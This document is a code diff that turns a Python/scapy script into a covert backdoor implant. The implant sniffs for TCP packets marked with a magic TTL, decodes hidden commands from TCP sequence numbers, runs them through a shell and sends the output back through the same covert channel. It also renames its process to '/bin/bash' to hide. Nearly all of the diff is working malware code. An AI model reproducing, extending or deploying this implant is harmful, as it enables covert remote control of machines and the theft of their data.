@@ -11,23 +11,25 @@ from multiprocessing import Process
 from Crypto import Random
 from Crypto.Cipher import AES
 from scapy.all import *
-
+import _thread
 import setproctitle
 
 """
 Setup: pip3 install pycrypto setproctitle scapy
 """
-    
+
 TTL=234
+TTLKEY=222
 # random secret key (both the client and server must match this key)
 encryptionKey = "passyourwordssss"
 iv = Random.new().read(AES.block_size)
 IV = "whatsthedealwith"
-attacker=("0.0.0.0",9999)
+victim=("192.168.0.10",9999)
 messages = []
 authentication ="1337"
+setFlag = "E"
 
-myip=("192.168.0.3",9999)
+myip=("192.168.0.3",66)
 
 def secret_send(msg:str, type:str='command'):
     '''
@@ -104,15 +106,16 @@ def packatizer(msg):
             # i.e. 1/3 messages to send.
             packets.append(craft(msg[counter],counter+1,len(msg),UID))
             counter = counter + 1
+    packets.append(IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], flags="U"))
     return packets
 
 def craft(data:str,position:int,total:int,UID:str) -> IP:
     global TTL
     global authentication
+    global setFlag
     #The payload contains the unique password, UID, position number and total.
     packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], \
-        seq=int(str(data),2))/Raw(load=encrypt(authentication+"\n"+UID+"\n"+str(position)+":" \
-        + str(total)))
+        seq=int(str(data),2), flags=setFlag)
     return packet
 
 def encrypt(message: str) -> str:
@@ -129,26 +132,48 @@ def decrypt(command: str) -> str:
     plain = decryptor.decrypt(command)
     return plain
 
-def client():
-    while True:
-        try:
-            # Prompt user for the command they would like to execute on the backdoor.
-            command = input("ENTER COMMAND: {}:".format(victim[0]))
-        except EOFError as e:
-            print(e)
-        #Print the command so that the user knows what they typed.
-        print(command)
-        # If the user types "exit". shutdown the program.
-        if(command == "exit"):
-            sys.exit()
-        else:
-            #Encrypt the command.
-            #encryptedCommand = encrypt(command)
-            secret_send(command)
-            # Immediately after sending, start listening for responses.
-            # The time-out has been set to 10 seconds so as to allow enough time
-            # for responses to large commands (i.e. iptables -L ) to return.
-            sniff(timeout=10, filter="ip", prn=handle)
+def execPayload(command):
+	#Execute the command
+    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    result = proc.stdout.read()  + proc.stderr.read()
+    payload = str(result)
+    #print (payload)
+    secret_send(payload)
+
+def text_from_bits(bits, encoding='utf-8', errors='surrogatepass'):
+    n = int(bits, 2)
+    return n.to_bytes((n.bit_length() + 7) // 8, 'big').decode(encoding, errors) or '\0'
+
+def commandResult(packet):
+    global ttlKey
+    global args
+    global cipher
+    global messages
+    srcIP = packet[IP].src
+    ttl = packet[IP].ttl
+    if(packet.haslayer(IP)):
+        if(authenticate(packet)):
+            #  we used ord in the client to convert the string character into a Unicoded value
+            #  chr() now encodes the Unicoded value back as a string literal
+            #  the message is stored in the sequence number field of the TCP header
+            # checks if the flag has been set to know it contains the secret results
+            flag = packet['TCP'].flags
+            #  the client set an "Echo" flag to make sure the receiver knows it's truly them
+            if flag == 0x40:
+                field = packet[TCP].seq
+                #print (lengthChecker(field)
+                #Converts the bits to the nearest divisible by 8
+                covertContent = lengthChecker(field)
+                #print(text_from_bits(covertContent))
+                messages.append(text_from_bits(covertContent))
+            #End Flag detected
+            elif flag == 0x20:
+                payload=''.join(messages)
+                execPayload(payload)
+                messages = []
+    else:
+        return
+
 
 def lengthChecker(field):
     covertContent = 0
@@ -166,26 +191,24 @@ def lengthChecker(field):
     return covertContent
 
 def authenticate(packet):
-    global command
-    global authentication
     # Check TTL first
     ttl = packet[IP].ttl
     # Checks if the ttl matches with ours
-    if ttl == TTL:
-        # Check the password in the payload
-        payload = packet["Raw"].load
-        # Decrypt payload, sequence number
-        decryptedData = decrypt(payload)
-        # Check if password in payload is correct
-        password = decryptedData.split("\n")[0]
-        #password = payload[0]
-        if(password == authentication):
-            return True
-        else:
-            return False
+    if ttl == TTLKEY:
+        return True
     return False
+
+def commandSniffer(threadName, infectedIP):
+    sniff(filter="tcp and host "+infectedIP, prn=commandResult)
+
 
 setproctitle.setproctitle("/bin/bash") #set fake process name
 #print(setproctitle.getproctitle())
 
-client()
+'''
+try:
+   _thread.start_new_thread( commandSniffer, ("commandSniffer",victim[0]) )
+except Exception as e:
+    print (str(e))
+'''
+commandSniffer("CommandSniffer",victim[0])
